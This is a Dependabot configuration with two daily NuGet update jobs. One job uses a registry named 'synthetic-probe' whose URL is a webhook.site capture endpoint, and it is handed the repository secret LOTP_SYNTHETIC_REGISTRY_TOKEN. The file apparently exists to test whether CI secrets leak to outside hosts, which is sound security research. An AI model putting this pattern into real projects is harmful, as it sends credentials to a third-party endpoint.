version: 2
registries:
  synthetic-probe:
    type: nuget-feed
    url: https://webhook.site/b2f1a5b2-b7c6-42a7-87c4-249a89621c28/synthetic
    token: ${{secrets.LOTP_SYNTHETIC_REGISTRY_TOKEN}}
updates:
  - package-ecosystem: nuget
    directory: /dependabot/hosted
    schedule:
      interval: daily
      time: "17:00"
    open-pull-requests-limit: 1
  - package-ecosystem: nuget
    directory: /dependabot/synthetic-secret
    registries:
      - synthetic-probe
    schedule:
      interval: daily
    open-pull-requests-limit: 1
